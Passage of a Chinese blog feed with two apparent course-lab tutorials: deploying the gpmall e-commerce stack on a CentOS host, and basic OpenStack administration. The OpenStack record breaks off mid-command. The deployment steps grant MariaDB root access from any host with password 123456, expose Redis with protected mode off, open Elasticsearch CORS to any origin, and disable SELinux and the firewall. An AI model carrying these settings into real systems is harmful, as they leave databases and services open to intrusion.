title="安装zookeeper"></a>安装zookeeper</h2><p>将下载好的zookeeper压缩包上传至&#x2F;opt&#x2F;目录下，并解压，然后进入zookeeper-3.4.14&#x2F;conf目录下，将zoo_sample.cfg文件重命名为zoo.cfg</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ]# cd /opt</span><br><span class="line">[root@gpmall-pjl opt]# tar -xzvf zookeeper-3.4.14.tar.gz</span><br><span class="line">[root@gpmall-pjl opt]# cd zookeeper-3.4.14/conf</span><br></pre></td></tr></table></figure><p> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/12.png"></p><h2 id="启动zookeeper："><a href="#启动zookeeper：" class="headerlink" title="启动zookeeper："></a>启动zookeeper：</h2><p>进入到zookeeper-3.4.14&#x2F;bin目录下，启动zookeeper服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl bin]# ./zkServer.sh start</span><br><span class="line">[root@gpmall-pjl bin]# ./zkServer.sh status</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/13.png"><br>安装kafka（这里用到的kafka版本为kafka_2.11-1.1.1）<br>将kafka_2.11-1.1.1.tgz包上传到&#x2F;opt目录下，并解压<br>进入到kafka_2.11-1.1.1&#x2F;bin目录下，启动Kafka服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl opt]# tar -xzvf kafka_2.11-1.1.1.tgz</span><br><span class="line">[root@gpmall-pjl opt]# cd kafka_2.11-1.1.1/bin</span><br><span class="line">[root@gpmall-pjl bin]# ./kafka-server-start.sh -daemon ../config/server.properties</span><br><span class="line">[root@gpmall-pjl bin]# jps</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/14.png"></p><h2 id="配置、启动数据库"><a href="#配置、启动数据库" class="headerlink" title="配置、启动数据库"></a>配置、启动数据库</h2><p>修改&#x2F;etc&#x2F;my.cnf配置文件，添加字段如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">init_connect=&#x27;SET collation_connection=utf8_unicode_ci&#x27;</span><br><span class="line">init_conncet=&#x27;SET NAMES utf8&#x27;</span><br><span class="line">character-set-server=utf8</span><br><span class="line">collation-server=utf8_unicode_ci</span><br><span class="line">skip-character-set-client-handshake</span><br></pre></td></tr></table></figure><p> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/15.png"></p><h3 id="初始化数据库"><a href="#初始化数据库" class="headerlink" title="初始化数据库"></a>初始化数据库</h3><p> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/16.png"></p><h3 id="登录mariadb数据库"><a href="#登录mariadb数据库" class="headerlink" title="登录mariadb数据库"></a>登录mariadb数据库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# mysql -u root -p</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/17.png"></p><h3 id="设置root用户权限"><a href="#设置root用户权限" class="headerlink" title="设置root用户权限"></a>设置root用户权限</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;grant all privileges on *.* to root@localhost identified by &#x27;123456&#x27; with grant option;</span><br><span class="line">&gt;grant all privileges on *.* to root@&quot;%&quot; identified by &#x27;123456&#x27; with grant option;</span><br></pre></td></tr></table></figure><p>将gpmall.sql文件上传至云主机的&#x2F;root目录下。创建数据库gpmall并导入gpmall.sql文件<br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/18.png"></p><p>退出数据库并设置开机自启</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# systemctl enable mariadb</span><br></pre></td></tr></table></figure><h2 id="配置、启动redis服务"><a href="#配置、启动redis服务" class="headerlink" title="配置、启动redis服务"></a>配置、启动redis服务</h2><p>修改redis配置文件，编辑&#x2F;etc&#x2F;redis.conf<br>将文件中bind 127.0.0.1这一行注释掉；将protected-mode yes改为protected-mode no<br> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/19.png"><br> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/20.png"></p><p>启动redis服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# systemctl start redis</span><br><span class="line">[root@gpmall-pjl ~]# systemctl enable redis</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/21.png"></p><h2 id="配置Elasticsearch服务并启动"><a href="#配置Elasticsearch服务并启动" class="headerlink" title="配置Elasticsearch服务并启动"></a>配置Elasticsearch服务并启动</h2><p>配置&#x2F;etc&#x2F;elasticsearch&#x2F;elasticsearch.yml<br>在文档上面加入如下三行代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.cors.enabled:true</span><br><span class="line">http.cors.allow-origin: &quot;*&quot;</span><br><span class="line">http.cors.allow-credentials: true</span><br></pre></td></tr></table></figure><p> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/22.png"><br>并将如下四条语句前的注释去掉，并修改network.host的ip为本机ip<br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/23.png"><br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/24.png"></p><p>最后修改完之后保存并退出，然后启动elasticsearch并设置开机自启：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# systemctl start elasticsearch</span><br><span class="line">[root@gpmall-pjl ~]# systemctl enable elasticsearch</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/25.png"></p><h2 id="部署前端"><a href="#部署前端" class="headerlink" title="部署前端"></a>部署前端</h2><p>将dist目录上传至主机的&#x2F;root目录下，将dist目录下的文件，复制到nginx的默认项目路径（首先清空默认项目路径下的文件。）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# rm -rf /usr/share/nginx/html/*</span><br><span class="line">[root@gpmall-pjl ~]# cp  -rvf dist/* /usr/share/nginx/html/</span><br></pre></td></tr></table></figure><p>修改nginx的配置文件&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf，添加映射如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /usr &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:8082;</span><br><span class="line">&#125;</span><br><span class="line">location /shopping &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:8081;</span><br><span class="line">&#125;</span><br><span class="line">location /cashier &#123;</span><br><span class="line">    proxy_pass http://127.0.0.1:8083;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/26.png"><br>重启nginx服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# systemctl restart nginx</span><br><span class="line">[root@gpmall-pjl ~]# systemctl status nginx</span><br></pre></td></tr></table></figure><p> <img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/27.png"></p><h2 id="部署后端"><a href="#部署后端" class="headerlink" title="部署后端"></a>部署后端</h2><p>将提供的4个jar包上传到服务器的&#x2F;root目录下<br>按顺序启动<br>按照顺序运行4个jar包（输入一条命令运行完成后，敲一下回车键，接着输入下一条命令）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# nohup java -jar shopping-provider-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line">[root@gpmall-pjl ~]# nohup java -jar user-provider-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line">[root@gpmall-pjl ~]# nohup java -jar gpmall-shopping-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line">[root@gpmall-pjl ~]# nohup java -jar gpmall-user-0.0.1-SNAPSHOT.jar &amp;</span><br></pre></td></tr></table></figure><p>验证jar包运行状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]# jobs</span><br></pre></td></tr></table></figure><p><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/28.png"><br> 关闭selinux和防火墙<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@gpmall-pjl ~]#  setenforce 0</span><br><span class="line">[root@gpmall-pjl ~]# systemctl stop firewalld</span><br><span class="line">[root@gpmall-pjl ~]# systemctl disable firewalld</span><br><span class="line">[root@gpmall-pjl ~]# curl http://192.168.200.22/#/home</span><br></pre></td></tr></table></figure><br><img src="/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E9%83%A8%E7%BD%B2/29.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;创建虚拟机&quot;&gt;&lt;a href=&quot;#创建虚拟机&quot; class=&quot;headerlink&quot; title=&quot;创建虚拟机&quot;&gt;&lt;/a&gt;创建虚拟机&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%BA%94%E7%94%A8%E</summary>
      
    
    
    
    
    <category term="linux" scheme="https://jielunya.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Openstack云平台的基础运维</title>
    <link href="https://jielunya.github.io/2022/12/07/Openstack%E4%BA%91%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/"/>
    <id>https://jielunya.github.io/2022/12/07/Openstack%E4%BA%91%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%9F%BA%E7%A1%80%E8%BF%90%E7%BB%B4/</id>
    <published>2022-12-07T15:03:22.283Z</published>
    <updated>2022-12-24T12:02:58.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mysql基础运维"><a href="#mysql基础运维" class="headerlink" title="mysql基础运维"></a>mysql基础运维</h2><h3 id="查看数据库服务是否处于active状态"><a href="#查看数据库服务是否处于active状态" class="headerlink" title="查看数据库服务是否处于active状态"></a>查看数据库服务是否处于active状态</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# systemctl status mariadb</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/1.png"></p><h3 id="进入mysql，查看所有数据库"><a href="#进入mysql，查看所有数据库" class="headerlink" title="进入mysql，查看所有数据库"></a>进入mysql，查看所有数据库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# mysql -u root -p</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show databases;</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/3.png"></p><h3 id="进入keystone数据库，查看所有表，查看local-user表记录"><a href="#进入keystone数据库，查看所有表，查看local-user表记录" class="headerlink" title="进入keystone数据库，查看所有表，查看local_user表记录"></a>进入keystone数据库，查看所有表，查看local_user表记录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; use keystone</span><br><span class="line">MariaDB [keystone]&gt; select * from local_user;</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/4.png"></p><h2 id="keystone基础运维"><a href="#keystone基础运维" class="headerlink" title="keystone基础运维"></a>keystone基础运维</h2><h3 id="列出所有用户"><a href="#列出所有用户" class="headerlink" title="列出所有用户"></a>列出所有用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl~]# source /etc/keystone/admin-openrc.sh</span><br><span class="line">[root@controller-pjl ~]# openstack user list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/5.png"></p><h3 id="创建用户："><a href="#创建用户：" class="headerlink" title="创建用户："></a>创建用户：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack user create panjielun --password 000000 --domain demo </span><br><span class="line">--project admin</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/6.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack user list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/7.png"></p><h3 id="创建项目："><a href="#创建项目：" class="headerlink" title="创建项目："></a>创建项目：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack project create yjs213 --domain demo</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/8.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack project list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/9.png"></p><h3 id="创建角色："><a href="#创建角色：" class="headerlink" title="创建角色："></a>创建角色：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack role create yjs-user</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/10.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack role list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/11.png"></p><h3 id="绑定新用户和项目权限："><a href="#绑定新用户和项目权限：" class="headerlink" title="绑定新用户和项目权限："></a>绑定新用户和项目权限：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack role add yjs-user --project yjs213 --user panjielun</span><br><span class="line">[root@controller-pjl ~]# openstack project list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/12.png"></p><h3 id="创建角色：-1"><a href="#创建角色：-1" class="headerlink" title="创建角色："></a>创建角色：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack role create yjs-user</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/13.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack role list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/14.png"></p><h3 id="绑定新用户和项目权限：-1"><a href="#绑定新用户和项目权限：-1" class="headerlink" title="绑定新用户和项目权限："></a>绑定新用户和项目权限：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack role add yjs-user --project yjs213 --user panjielun</span><br><span class="line">[root@controller-pjl ~]# openstack project list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/15.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack user list</span><br><span class="line">[root@controller-pjl ~]# openstack user show e39c9f5cf9e94e47b98a66ead117de20</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/16.png"><br><img src="/Openstack%E8%BF%90%E7%BB%B4/17.png"></p><h3 id="查看keystone的endpoint端点是否存在"><a href="#查看keystone的endpoint端点是否存在" class="headerlink" title="查看keystone的endpoint端点是否存在"></a>查看keystone的endpoint端点是否存在</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack endpoint list |grep keystone</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/18.png"></p><h3 id="查看5000和35357端口是否处于开放状态"><a href="#查看5000和35357端口是否处于开放状态" class="headerlink" title="查看5000和35357端口是否处于开放状态"></a>查看5000和35357端口是否处于开放状态</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# netstat -lnep |grep 5000</span><br><span class="line">[root@controller-pjl ~]# netstat -lnep |grep 35357</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/19.png"></p><h2 id="glance的基础运维"><a href="#glance的基础运维" class="headerlink" title="glance的基础运维"></a>glance的基础运维</h2><h3 id="创建cirros镜像"><a href="#创建cirros镜像" class="headerlink" title="创建cirros镜像"></a>创建cirros镜像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# glance image-create --name cirros --disk-format qcow2 --container-format bare --file /opt/images/CentOS_7.5_x86_64_XD.qcow2</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/20.png"></p><h3 id="查看镜像列表"><a href="#查看镜像列表" class="headerlink" title="查看镜像列表"></a>查看镜像列表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# glance image-list</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/21.png"></p><h3 id="更改镜像名字"><a href="#更改镜像名字" class="headerlink" title="更改镜像名字"></a>更改镜像名字</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# glance image-update aac8f6ef-5b38-4219-91b1-fead46cb5030 --name panjielun</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/22.png"></p><h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# glance image-delete aac8f6ef-5b38-4219-91b1-fead46cb5030</span><br><span class="line">[root@controller-pjl ~]# glance image-list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/23.png"></p><h2 id="nova的基础运维"><a href="#nova的基础运维" class="headerlink" title="nova的基础运维"></a>nova的基础运维</h2><h3 id="创建云主机类型mini-1VCPU-512M内存，5G硬盘-、查看云主机类型"><a href="#创建云主机类型mini-1VCPU-512M内存，5G硬盘-、查看云主机类型" class="headerlink" title="创建云主机类型mini(1VCPU,512M内存，5G硬盘)、查看云主机类型"></a>创建云主机类型mini(1VCPU,512M内存，5G硬盘)、查看云主机类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# nova flavor-create mini 22 512 5 1</span><br><span class="line">[root@controller-pjl ~]# nova flavor-list</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/24.png"></p><h3 id="创建一虚拟机panjielun实例"><a href="#创建一虚拟机panjielun实例" class="headerlink" title="创建一虚拟机panjielun实例"></a>创建一虚拟机panjielun实例</h3><p>创一个稍微大一点的主机类型，2g运行内存，20g硬盘，1cpu，命名为small。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# nova flavor-create small 222 2048 20 1</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/25.png"><br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack server create panjielun --image CentOS7.5 --network wl2 --flavor small</span><br></pre></td></tr></table></figure><br>其中panjielun为主机名，CentOS7.5为镜像名字，wl2，为内网地址的名字，small为主机类型<br> <img src="/Openstack%E8%BF%90%E7%BB%B4/26.png"></p><h3 id="启动实例"><a href="#启动实例" class="headerlink" title="启动实例"></a>启动实例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# nova list</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/27.png"></p><h3 id="查看实例"><a href="#查看实例" class="headerlink" title="查看实例"></a>查看实例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# nova show panjielun</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/28.png"></p><h3 id="使用-nova-service-list-查看服务的状态"><a href="#使用-nova-service-list-查看服务的状态" class="headerlink" title="使用 nova  service-list 查看服务的状态"></a>使用 nova  service-list 查看服务的状态</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# nova service-list</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/29.png"></p><h3 id="使用nova-hypervisor-list-查看计算节点的主机列表"><a href="#使用nova-hypervisor-list-查看计算节点的主机列表" class="headerlink" title="使用nova hypervisor-list 查看计算节点的主机列表"></a>使用nova hypervisor-list 查看计算节点的主机列表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# nova hypervisor-list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/30.png"></p><h2 id="neutron-基础运维"><a href="#neutron-基础运维" class="headerlink" title="neutron 基础运维"></a>neutron 基础运维</h2><h3 id="使用openstack-network-list命令查看所有网络"><a href="#使用openstack-network-list命令查看所有网络" class="headerlink" title="使用openstack network list命令查看所有网络"></a>使用openstack network list命令查看所有网络</h3><p>使用openstack port list命令查看所有端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack port list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/31.png"></p><h2 id="cinder-运维"><a href="#cinder-运维" class="headerlink" title="cinder 运维"></a>cinder 运维</h2><h3 id="创建云硬盘类型"><a href="#创建云硬盘类型" class="headerlink" title="创建云硬盘类型"></a>创建云硬盘类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# cinder type-create panjielun</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/32.png"><br>创建一个云硬盘</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# cinder create 10 --name panjielun --volume-type panjielun</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/33.png"><br>将一个云主机挂载该云硬盘</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack server add volume panjielun panjielun</span><br><span class="line">[root@controller-pjl ~]# openstack server show panjielun</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/34.png"><br>查看是否挂载成功</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack server show panjielun |grep volume</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/35.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# cinder list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/36.png"></p><h2 id="swift运维"><a href="#swift运维" class="headerlink" title="swift运维"></a>swift运维</h2><h3 id="创建容器、查询容器"><a href="#创建容器、查询容器" class="headerlink" title="创建容器、查询容器"></a>创建容器、查询容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# swift post panjielun</span><br><span class="line">[root@controller-pjl ~]# swift list</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/37.png"></p><h3 id="上传文件之容器"><a href="#上传文件之容器" class="headerlink" title="上传文件之容器"></a>上传文件之容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# swift upload panjielun /opt/images/CentOS_7.5_x86_64_XD.qcow2</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/38.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# swift stat panjielun</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/39.png"></p><h3 id="从容器下载文件"><a href="#从容器下载文件" class="headerlink" title="从容器下载文件"></a>从容器下载文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# swift download panjielun opt/images/CentOS_7.5_x86_64_XD.qcow2 -o /root/CentOS_7.5_x86_64_XD.qcow2</span><br></pre></td></tr></table></figure><p>  <img src="/Openstack%E8%BF%90%E7%BB%B4/40.png"></p><h3 id="查看容器服务器的状态"><a href="#查看容器服务器的状态" class="headerlink" title="查看容器服务器的状态"></a>查看容器服务器的状态</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# swift stat panjielun</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/41.png"></p><h2 id="Heat运维"><a href="#Heat运维" class="headerlink" title="Heat运维"></a>Heat运维</h2><h3 id="查看云主机的类型列表"><a href="#查看云主机的类型列表" class="headerlink" title="查看云主机的类型列表"></a>查看云主机的类型列表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack flavor list</span><br></pre></td></tr></table></figure><p>  <img src="/Openstack%E8%BF%90%E7%BB%B4/42.png"></p><h3 id="查看镜像列表-1"><a href="#查看镜像列表-1" class="headerlink" title="查看镜像列表"></a>查看镜像列表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack image list</span><br></pre></td></tr></table></figure><p>  <img src="/Openstack%E8%BF%90%E7%BB%B4/43.png"></p><h3 id="查看网络列表"><a href="#查看网络列表" class="headerlink" title="查看网络列表"></a>查看网络列表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack network list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/44.png"></p><h3 id="创建Heat模板文件demo-yaml"><a href="#创建Heat模板文件demo-yaml" class="headerlink" title="创建Heat模板文件demo.yaml"></a>创建Heat模板文件demo.yaml</h3><p>其中resouces.server 中使用的image，flavor为你自己环境中的某镜像和规格，通过上面查看的镜像列表和云主机类型列表里面进行选择<br> <img src="/Openstack%E8%BF%90%E7%BB%B4/45.png"></p><h3 id="网络的设置-，则通过export命令-，将内网的ID赋值给NET-ID变量"><a href="#网络的设置-，则通过export命令-，将内网的ID赋值给NET-ID变量" class="headerlink" title="网络的设置 ，则通过export命令 ，将内网的ID赋值给NET_ID变量"></a>网络的设置 ，则通过export命令 ，将内网的ID赋值给NET_ID变量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export NET_ID=&lt;NETWORK_ID&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# export NET_ID=0ebc6516-353e-4bb4-acb9-25b4a42b0d8b</span><br></pre></td></tr></table></figure><p> <img src="/Openstack%E8%BF%90%E7%BB%B4/46.png"></p><h3 id="执行“创建堆栈”命令"><a href="#执行“创建堆栈”命令" class="headerlink" title="执行“创建堆栈”命令"></a>执行“创建堆栈”命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack stack create -t demo.yaml --parameter &quot;NetID=$NET_ID&quot; </span><br><span class="line">panjielun_demo</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/47.png"></p><h3 id="查看堆栈列表"><a href="#查看堆栈列表" class="headerlink" title="查看堆栈列表"></a>查看堆栈列表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack stack list</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/48.png"></p><h3 id="查看新创建堆栈详细信息"><a href="#查看新创建堆栈详细信息" class="headerlink" title="查看新创建堆栈详细信息"></a>查看新创建堆栈详细信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack stack show panjielun_demo</span><br></pre></td></tr></table></figure><p><img src="/Openstack%E8%BF%90%E7%BB%B4/49.png"></p><h3 id="查看虚拟机实例列表进行确认（即通过完成堆栈创建，成功创建了一台虚拟机）"><a href="#查看虚拟机实例列表进行确认（即通过完成堆栈创建，成功创建了一台虚拟机）" class="headerlink" title="查看虚拟机实例列表进行确认（即通过完成堆栈创建，成功创建了一台虚拟机）"></a>查看虚拟机实例列表进行确认（即通过完成堆栈创建，成功创建了一台虚拟机）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller-pjl ~]# openstack server 